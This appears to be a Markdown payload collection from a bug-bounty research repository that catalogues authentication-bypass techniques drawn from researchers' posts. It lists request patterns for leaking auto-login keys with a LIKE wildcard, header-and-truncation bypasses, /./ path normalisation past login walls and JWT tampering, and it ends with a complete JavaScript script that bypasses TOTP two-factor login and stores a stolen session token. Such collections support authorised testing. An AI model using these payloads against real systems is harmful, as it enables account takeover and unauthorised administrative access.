# Payloads — auth-bypass

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. Unauthenticated account takeover via LIKE-wildcard leak of auto-login keys ($5,000)
- Researcher: @infinitelogins
- Post: https://x.com/infinitelogins/status/2117981403161764138
- Sources: `posts/infinitelogins/2026-11-04-2117981403161764138.md`

```
GET /autologin/lookup?key=% ; POST /autologin/resolve?key=% with {user_id,tenant_id} ; POST /autologin/devices with {user_id,key}
```

## 2. Layered auth bypass: .json static-path skip + %23 truncate + trusted-client header ($10,000)
- Researcher: @infinitelogins
- Post: https://x.com/infinitelogins/status/2108181015885685018
- Sources: `posts/infinitelogins/2026-10-08-2108181015885685018.md`

```
GET /api/employee/12345%23.json with header X-CLIENT-ID: WEBAPP
```

## 1. /./ path normalisation past a login wall into an admin console
- Researcher: @mdp_sec
- Post: https://x.com/mdp_sec/status/2120338219841544604
- Sources: `posts/mdp_sec/2026-11-11-2120338219841544604.md`, `writeups/mdp_sec/bug-bounty-hunting-prompts-readme.md`, `writeups/mdp_sec/mdpsec-home.md`, `writeups/mdp_sec/mdpsec-privacy.md`, `writeups/mdp_sec/mdpsec-security-test.md`, `writeups/mdp_sec/platform-reports.md`

```
Append /./ (also //, trailing dots, %2e) to a 403/login-gated path: /admin/./ passes the exact-match auth check then normalises to /admin at the router
```

## 2. $8,000 auth bypass on HackerOne — token signature not verified
- Researcher: @mdp_sec
- Post: https://x.com/mdp_sec/status/2118435683329310786
- Sources: `posts/mdp_sec/2026-11-05-2118435683329310786.md`, `writeups/mdp_sec/bug-bounty-hunting-prompts-readme.md`, `writeups/mdp_sec/mdpsec-home.md`, `writeups/mdp_sec/mdpsec-privacy.md`, `writeups/mdp_sec/mdpsec-security-test.md`, `writeups/mdp_sec/platform-reports.md`

```
Tamper JWT/token claims and signature (strip, alter, alg=none, self-sign) and confirm the server still accepts it
```

## 3. TOTP 2 Factor Authentication Bypass
- Source: `telegram writeups (verbatim excerpts)`

```
const USER = "target";
const PASSWORD = "correct horse battery staple";

fetch("/api/v1/login", {
	method: "POST",
	body: `{
		"cas": true,
		"totp": {
			"code": "Not Today",
			"type": "resume",
			"login": {
				"user": {
					"username": "${USER}"
				},
				"password": "${PASSWORD}"
			}
		}
	}`,
	headers: {
		"Content-Type": "application/json"
	}
})
.then(res => res.json())
.then(({ data: { userId, authToken }}) => {
	console.log(`login as ${userId}`);
	Meteor._localStorage.setItem(Accounts.USER_ID_KEY, userId);
	Meteor._localStorage.setItem(Accounts.LOGIN_TOKEN_KEY, authToken);
	window.location.reload()
});
```
